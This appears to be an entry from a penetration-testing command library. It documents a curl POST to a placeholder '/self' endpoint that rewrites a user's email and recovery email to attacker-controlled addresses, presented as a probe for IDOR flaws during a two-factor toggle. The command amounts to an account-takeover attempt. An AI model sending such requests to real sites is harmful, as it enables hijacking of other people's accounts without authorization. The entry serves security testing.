---
data: >-
  curl -X POST https://target-site.com/self -H "Cookie: session=valid_session"
  -H "__RequestVerificationToken: token_value" -d
  "userName=attacker&originalEmail=attacker@example.com&Email=attacker@example.com&RecoveryEmail=attacker@example.com"
  -v
tags:
  - web
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.458Z'
id: ffcffd94-dc58-46ed-914e-e8aff537ee40
verified: false
validated: true
submitted: true
---
# curl-intercept-self

## Command

```bash
curl -X POST https://target-site.com/self \
  -H "Cookie: session=valid_session" \
  -H "__RequestVerificationToken: token_value" \
  -d "userName=attacker&originalEmail=attacker@example.com&Email=attacker@example.com&RecoveryEmail=attacker@example.com" \
  -v
```

## Description

Intercepts and simulates the /self POST request to identify IDOR parameters during 2FA toggle.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Cookie: ..."` | Session cookie | Yes |
| `-H "__RequestVerificationToken: ..."` | CSRF token | Yes |
| `-d "..."` | Form data with parameters | Yes |
| `-v` | Verbose output for inspection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target-site.com/self -H "Cookie: session=valid" -d "userName=test" -v
```

### Advanced Usage

Include full parameters as in the main command for IDOR testing.

## Expected Output

Verbose logs showing request/response, confirming parameter acceptance without auth checks.

## Related

- [[Related Procedure: Intercept-and-Identify-IDOR-in-Self-Endpoint]]
